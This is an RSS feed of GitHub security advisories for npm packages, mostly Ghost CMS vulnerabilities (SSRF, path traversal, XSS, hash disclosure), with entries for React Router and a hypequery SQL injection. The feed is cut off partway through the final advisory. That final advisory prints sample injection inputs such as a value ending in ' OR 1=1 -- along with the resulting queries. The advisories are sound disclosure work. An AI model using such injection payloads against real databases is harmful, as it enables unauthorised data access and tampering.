<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-04T21:47:00.367Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Database Backup Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-cj62-hvv2-2q5h</id>
        <link href="https://github.com/advisories/GHSA-cj62-hvv2-2q5h"/>
        <updated>2026-08-04T21:41:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An Administrator-level user could remotely overwrite certain files on the filesystem leading to integrity and availability issues.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from 1.20.1 up to v6.54.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.54.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible, set <em>disableJSBackups</em> to "true" by running:</p>
<pre><code class="language-sh">$ ghost config set disableJSBackups true
$ ghost restart
</code></pre>
<h3 id="references">References</h3>
<p>Ghost thanks Jorian Woltjer of Aikido Security, Mitchell Benjamin of Revamp Studio, and meifukun for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email Ghost at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-cj62-hvv2-2q5h">https://github.com/TryGhost/Ghost/security/advisories/GHSA-cj62-hvv2-2q5h</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/f466c300191a609ed36c8d7c5d1e33ccd440786b">https://github.com/TryGhost/Ghost/commit/f466c300191a609ed36c8d7c5d1e33ccd440786b</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.54.1">https://github.com/TryGhost/Ghost/releases/tag/v6.54.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cj62-hvv2-2q5h">https://github.com/advisories/GHSA-cj62-hvv2-2q5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cj62-hvv2-2q5h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:41:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Server-Side Request Forgery in Image Fetching]]></title>
        <id>https://github.com/advisories/GHSA-gcvv-72q8-9v76</id>
        <link href="https://github.com/advisories/GHSA-gcvv-72q8-9v76"/>
        <updated>2026-08-04T21:38:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) in Ghost Admin allowed any staff-level user to perform a blind HTTP GET request against internal hosts. No output was returned, but this could have been used to probe open ports on internal hosts.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v0.10.0 up to v6.54.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.54.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="references">References</h3>
<p>Ghost thanks Younghun Ko, vx77, and Miguel Segovia Gil for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email Ghost at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-gcvv-72q8-9v76">https://github.com/TryGhost/Ghost/security/advisories/GHSA-gcvv-72q8-9v76</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/5eff2de0f477b11c88f20bceb9d184c0d3b8a62e">https://github.com/TryGhost/Ghost/commit/5eff2de0f477b11c88f20bceb9d184c0d3b8a62e</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.54.1">https://github.com/TryGhost/Ghost/releases/tag/v6.54.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gcvv-72q8-9v76">https://github.com/advisories/GHSA-gcvv-72q8-9v76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcvv-72q8-9v76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:38:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Blind Password Hash Disclosure in Ghost Admin API]]></title>
        <id>https://github.com/advisories/GHSA-jm22-3w23-5q7w</id>
        <link href="https://github.com/advisories/GHSA-jm22-3w23-5q7w"/>
        <updated>2026-08-04T21:28:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any staff-level user was able to leak the hashed passwords of other staff users. An offline password-guessing attack against the hashes could lead to account takeover if successful, but <a href="https://docs.ghost.org/security#device-verification">Device Verification</a> should have prevented an attacker from logging in with a recovered password. Depending on the database used, leaked hashes may not have had the correct casing for all characters, increasing the difficulty of a password-guessing attack.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost versions v6.54.0 and earlier.</p>
<h3 id="patches">Patches</h3>
<p>v6.54.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible, ensure all staff users have <a href="https://docs.ghost.org/security#email-2fa">Multi-factor Authentication</a> (MFA) enabled. This will help prevent an attacker from logging in with any passwords that are successfully recovered from the leaked hashes.</p>
<h3 id="references">References</h3>
<p>Ghost thanks Chapman Schleiss for disclosing this vulnerability responsibly. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-jm22-3w23-5q7w">https://github.com/TryGhost/Ghost/security/advisories/GHSA-jm22-3w23-5q7w</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/29628">https://github.com/TryGhost/Ghost/pull/29628</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/63c31fad7e473caa62d8fbb4651a04a2a62b5d00">https://github.com/TryGhost/Ghost/commit/63c31fad7e473caa62d8fbb4651a04a2a62b5d00</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.54.1">https://github.com/TryGhost/Ghost/releases/tag/v6.54.1</a></li>
<li><a href="https://github.com/advisories/GHSA-jm22-3w23-5q7w">https://github.com/advisories/GHSA-jm22-3w23-5q7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jm22-3w23-5q7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:28:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@remix-run/router] React Router's same-origin redirect with path starting // causes open redirect via protocol-relative URL reinterpretation]]></title>
        <id>https://github.com/advisories/GHSA-2j2x-hqr9-3h42</id>
        <link href="https://github.com/advisories/GHSA-2j2x-hqr9-3h42"/>
        <updated>2026-08-04T21:26:11.000Z</updated>
        <content type="html"><![CDATA[<p>Certain URLs passed to the <code>redirect</code> function can trigger an open redirect to an external domain depending on the level of validation done by the application prior to returning the <code>redirect</code>.</p>
<blockquote>
<p>[!NOTE]
This does not impact your React Router application if you are using <a href="https://reactrouter.com/start/modes#declarative">Declarative Mode</a> (<code>&lt;BrowserRouter&gt;</code>)</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-2j2x-hqr9-3h42">https://github.com/remix-run/react-router/security/advisories/GHSA-2j2x-hqr9-3h42</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40181">https://nvd.nist.gov/vuln/detail/CVE-2026-40181</a></li>
<li><a href="https://github.com/remix-run/react-router/commit/d77f6b1">https://github.com/remix-run/react-router/commit/d77f6b1</a></li>
<li><a href="https://github.com/advisories/GHSA-2j2x-hqr9-3h42">https://github.com/advisories/GHSA-2j2x-hqr9-3h42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j2x-hqr9-3h42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T20:58:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Mobiledoc image-size fetch SSRF]]></title>
        <id>https://github.com/advisories/GHSA-g366-23fw-ggp6</id>
        <link href="https://github.com/advisories/GHSA-g366-23fw-ggp6"/>
        <updated>2026-08-04T21:25:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When re-rendering posts, Ghost would refetch missing image dimensions by issuing an outbound HTTP request to the URL stored on an image card — without restricting that URL to trusted image hosts. An authenticated staff user able to create or edit posts could therefore point an image card at an attacker-chosen host and cause the Ghost server to request it on their behalf, including hosts on internal networks or cloud instance metadata endpoints that would not normally be reachable from the public internet.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v6.19.3 up to v6.21.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.21.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-g366-23fw-ggp6">https://github.com/TryGhost/Ghost/security/advisories/GHSA-g366-23fw-ggp6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53946">https://nvd.nist.gov/vuln/detail/CVE-2026-53946</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/26753">https://github.com/TryGhost/Ghost/pull/26753</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/ba692df7f27162d0440d57487f16c530416a8eb2">https://github.com/TryGhost/Ghost/commit/ba692df7f27162d0440d57487f16c530416a8eb2</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.21.1">https://github.com/TryGhost/Ghost/releases/tag/v6.21.1</a></li>
<li><a href="https://github.com/advisories/GHSA-g366-23fw-ggp6">https://github.com/advisories/GHSA-g366-23fw-ggp6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g366-23fw-ggp6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:25:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Server-side request forgery via DNS rebinding in external request handling]]></title>
        <id>https://github.com/advisories/GHSA-ch52-px8q-f22j</id>
        <link href="https://github.com/advisories/GHSA-ch52-px8q-f22j"/>
        <updated>2026-08-04T21:25:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Ghost’s private-IP check for outbound HTTP requests could be bypassed via DNS rebinding, allowing an attacker to coerce the Ghost server into reaching hosts on internal networks through features that issue external fetches.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v6.0.9 up to v6.21.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.21.1 contains a fix for this issue. </p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible, operators can reduce exposure by preventing the Ghost server from reaching sensitive internal ranges at the network layer — for example, egress firewall rules that block the Ghost process from initiating connections to RFC1918 networks, loopback, link-local (including <code>169.254.169.254</code>) and any other internal service ranges. Disabling features that trigger outbound fetches (oEmbed, webmentions, recommendations) will further limit the attack surface but does not remove the underlying issue.</p>
<h3 id="references">References</h3>
<p>Ghost thanks Oluwaseun Esther Folorunsho, Lakshmikanthan K (<a href="https://github.com/l3tchupkt">@l3tchupkt</a>), <a href="https://www.offgridsec.com/">Offgrid Security</a>, and Baki for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-ch52-px8q-f22j">https://github.com/TryGhost/Ghost/security/advisories/GHSA-ch52-px8q-f22j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53945">https://nvd.nist.gov/vuln/detail/CVE-2026-53945</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/26754">https://github.com/TryGhost/Ghost/pull/26754</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/07d604100eb3df5c9b382fce6232928c96329448">https://github.com/TryGhost/Ghost/commit/07d604100eb3df5c9b382fce6232928c96329448</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.21.1">https://github.com/TryGhost/Ghost/releases/tag/v6.21.1</a></li>
<li><a href="https://github.com/advisories/GHSA-ch52-px8q-f22j">https://github.com/advisories/GHSA-ch52-px8q-f22j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ch52-px8q-f22j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:24:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Private IP filtering bypass to make server-side requests to internal services]]></title>
        <id>https://github.com/advisories/GHSA-wvp2-4qqp-4h3r</id>
        <link href="https://github.com/advisories/GHSA-wvp2-4qqp-4h3r"/>
        <updated>2026-08-04T21:13:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When making an external request, it is possible to bypass the IP filter that ensures the request isn't going to an internal service using an IPv6 literal which maps to a private IPv4 address.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v6.0.9 up to v6.21.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.21.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="references">References</h3>
<p>Ghost thanks <a href="http://github.com/l3tchupkt">l3tchupkt</a> for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-wvp2-4qqp-4h3r">https://github.com/TryGhost/Ghost/security/advisories/GHSA-wvp2-4qqp-4h3r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53944">https://nvd.nist.gov/vuln/detail/CVE-2026-53944</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/26749">https://github.com/TryGhost/Ghost/pull/26749</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/9b7f2212970fade08ecbec543b405190471e38d4">https://github.com/TryGhost/Ghost/commit/9b7f2212970fade08ecbec543b405190471e38d4</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.21.1">https://github.com/TryGhost/Ghost/releases/tag/v6.21.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wvp2-4qqp-4h3r">https://github.com/advisories/GHSA-wvp2-4qqp-4h3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvp2-4qqp-4h3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:13:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Archived Offers can be Redeemed]]></title>
        <id>https://github.com/advisories/GHSA-4wx2-7gvj-qfq3</id>
        <link href="https://github.com/advisories/GHSA-4wx2-7gvj-qfq3"/>
        <updated>2026-08-04T21:11:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A missing validation check allowed users to redeem subscription offers that were no longer active.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v4.22.0 up to v6.54.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.54.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="references">References</h3>
<p>Ghost thanks Pedro Pinho for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-4wx2-7gvj-qfq3">https://github.com/TryGhost/Ghost/security/advisories/GHSA-4wx2-7gvj-qfq3</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/d91c0fc52dfc987d71a9803dbcbe6447d21b92fb">https://github.com/TryGhost/Ghost/commit/d91c0fc52dfc987d71a9803dbcbe6447d21b92fb</a></li>
<li><a href="https://github.com/advisories/GHSA-4wx2-7gvj-qfq3">https://github.com/advisories/GHSA-4wx2-7gvj-qfq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4wx2-7gvj-qfq3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:11:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: File Upload Content-Type Spoofing]]></title>
        <id>https://github.com/advisories/GHSA-944x-pm95-3jpr</id>
        <link href="https://github.com/advisories/GHSA-944x-pm95-3jpr"/>
        <updated>2026-08-04T21:05:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Insufficient validation of the client-supplied <code>Content-Type</code> on Ghost's Admin API file upload endpoint allowed uploaded files to be served from the site with an attacker-chosen content type on S3/GCS storage backends. On installations that serve uploaded files from the same origin as the site, this could have been used to facilitate stored cross-site scripting against site visitors or staff.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v6.19.4 up to v6.21.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.21.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-944x-pm95-3jpr">https://github.com/TryGhost/Ghost/security/advisories/GHSA-944x-pm95-3jpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53948">https://nvd.nist.gov/vuln/detail/CVE-2026-53948</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/26751">https://github.com/TryGhost/Ghost/pull/26751</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/d659e752d6636144d75b9aa94062cdbc88a16b21">https://github.com/TryGhost/Ghost/commit/d659e752d6636144d75b9aa94062cdbc88a16b21</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.21.1">https://github.com/TryGhost/Ghost/releases/tag/v6.21.1</a></li>
<li><a href="https://github.com/advisories/GHSA-944x-pm95-3jpr">https://github.com/advisories/GHSA-944x-pm95-3jpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-944x-pm95-3jpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:05:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost: Cross-Site Scripting in Universal Import]]></title>
        <id>https://github.com/advisories/GHSA-2gx6-7gx2-wwcf</id>
        <link href="https://github.com/advisories/GHSA-2gx6-7gx2-wwcf"/>
        <updated>2026-08-04T21:03:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Universal Import feature in Ghost Admin failed to properly sanitize imported content resulting in XSS in post content.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This vulnerability is present in Ghost from v5.26.0 up to v6.54.0.</p>
<h3 id="patches">Patches</h3>
<p>v6.54.1 contains a fix for this issue.</p>
<h3 id="how-to-update">How to update</h3>
<p>For self-hosters using Docker, find <a href="https://hub.docker.com/_/ghost">Docker's official Ghost image here</a>. Updating a Docker-based Ghost instance <a href="https://docs.ghost.org/install/docker#updating-ghost">is documented here</a>. </p>
<p>If your Ghost is a Ghost-CLI install see our documentation on <a href="https://docs.ghost.org/update">updating it to the latest version here</a>. </p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible, avoid using the Universal Import feature.</p>
<h3 id="references">References</h3>
<p>Ghost thanks meifukun for disclosing this vulnerability responsibly.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@ghost.org">security@ghost.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-2gx6-7gx2-wwcf">https://github.com/TryGhost/Ghost/security/advisories/GHSA-2gx6-7gx2-wwcf</a></li>
<li><a href="https://github.com/TryGhost/Ghost/pull/29635">https://github.com/TryGhost/Ghost/pull/29635</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/a8bea3a4ceec4c852b880f4885119453c3d8588e">https://github.com/TryGhost/Ghost/commit/a8bea3a4ceec4c852b880f4885119453c3d8588e</a></li>
<li><a href="https://github.com/TryGhost/Ghost/releases/tag/v6.54.1">https://github.com/TryGhost/Ghost/releases/tag/v6.54.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2gx6-7gx2-wwcf">https://github.com/advisories/GHSA-2gx6-7gx2-wwcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2gx6-7gx2-wwcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T21:03:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hypequery/clickhouse] @hypequery/clickhouse has SQL Injection in parameter escaping that allows arbitrary SQL execution]]></title>
        <id>https://github.com/advisories/GHSA-6wcc-39rp-hh9p</id>
        <link href="https://github.com/advisories/GHSA-6wcc-39rp-hh9p"/>
        <updated>2026-08-04T20:34:08.000Z</updated>
        <content type="html"><![CDATA[<p>A SQL injection vulnerability exists in the <code>escapeValue()</code> function used for parameter substitution. <code>escapeValue()</code> dispatches on the type of the parameter value, and two of its branches failed to escape safely. An attacker who can control a parameter value can terminate the enclosing string literal and have the rest of the value parsed as SQL.</p>
<p><strong>Vector 1 - string parameters. Fixed in 2.0.2.</strong> The string branch escaped <code>'</code> as <code>''</code> but left <code>\\</code> untouched. ClickHouse honours C-style backslash escapes as well as SQL-standard quote doubling, so a value ending in an odd number of backslashes escapes the closing quote and the next parameter lands outside the literal:</p>
<pre><code>where('a', 'eq', 'x\\')          -&gt;   WHERE a = 'x\\' AND b = ' OR 1=1 --'
</code></pre>
<p><strong>Vector 2 - object and array parameters. Fixed in 2.5.1, NOT in 2.0.2.</strong> The final branch of the same function rendered non-scalar values as <code>`'${JSON.stringify(value)}'`</code> with no escaping at all. JSON has no reason to escape the apostrophe, so any nested string containing <code>'</code> terminates the literal:</p>
<pre><code>where('meta', 'eq', { k: \"x' OR 1=1 -- \" })
                                -&gt;   WHERE meta = '{\"k\":\"x' OR 1=1 -- \"}'
</code></pre>
<p>The 2.0.2 patch changed only the string branch and did not address this. Vector 2 remained exploitable in <strong>2.0.2, 2.1.0, 2.1.1, 2.1.2, 2.1.3, 2.2.0, 2.3.0, 2.4.0 and 2.5.0</strong> - every release this advisory previously reported as patched.</p>
<p><strong>Who is impacted.</strong> Any application on a version below 2.5.1 that passes user-controlled input as a query parameter. Both vectors are reachable through the documented public API: <code>.where(column, operator, value)</code>, the <code>in</code> operator, and <code>adapter.render()</code> / <code>rawQuery()</code>.</p>
<p><strong>Schema type declarations do not mitigate vector 2.</strong> <code>createQueryBuilder().table()</code> builds its state with an empty column map, so the filter validator has no declared type to check against and returns without validating. Even where a schema is supplied, only <code>String</code>, <code>Int32</code>, <code>Int64</code>, <code>Float64</code> and <code>Date</code> columns are type-checked - <code>Map</code>, <code>Array</code>, <code>Bool</code>, <code>UUID</code>, <code>DateTime</code>, <code>UInt*</code>, <code>Enum</code> and <code>Nullable</code> columns are not - and any column name containing a <code>.</code> skips validation entirely.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade to <strong>2.5.1 or later</strong>. Both vectors are closed there.</p>
<ul>
<li><strong>Vector 1</strong> - fixed in <strong>2.0.2</strong> by <code>2dc1df7bae</code> (the referenced <code>4dfa9d77</code> is the same change
on the pull-request branch). Escapes backslashes before escaping single quotes.</li>
<li><strong>Vector 2</strong> - fixed in <strong>2.5.1</strong> by <code>2879161a81</code>, which routes the serialised JSON back through  <code>escapeValue()</code> so nested quotes are doubled. The same commit also rejects non-finite numbers and  invalid <code>Date</code> values instead of emitting them into the query.</li>
</ul>
<p>For anyone auditing the history: the vector-2 fix is bundled inside <code>2879161a81</code>, whose commit message is <em>"parenthesize logical groups in WHERE to preserve AND/OR precedence (#349)"</em>. Commit <code>4a1d4e38aa</code> (#350), whose message <em>does</em> describe the escaping fix, changes only a <code>bigint</code> branch - the escaping fix is already present in its parent.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrading is the only complete fix.</p>
<p>For <strong>vector 2</strong> only, applications on 2.0.2–2.5.0 that cannot upgrade can serialise non-scalar parameters themselves and pass the resulting string. That routes the value through the string branch, which is correctly escaped from 2.0.2 onward:</p>
<pre><code class="language-js">.where('meta', 'eq', JSON.stringify(value))   // safe on &gt;= 2.0.2
</code></pre>
<p>There is no workaround for <strong>vector 1</strong> other than upgrading to 2.0.2 or later.</p>
<p>Do not substitute application-level input validation or sanitisation for either fix. Correct escaping depends on the literal context the library constructs, so the library has to own it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hypequery/hypequery/security/advisories/GHSA-6wcc-39rp-hh9p">https://github.com/hypequery/hypequery/security/advisories/GHSA-6wcc-39rp-hh9p</a></li>
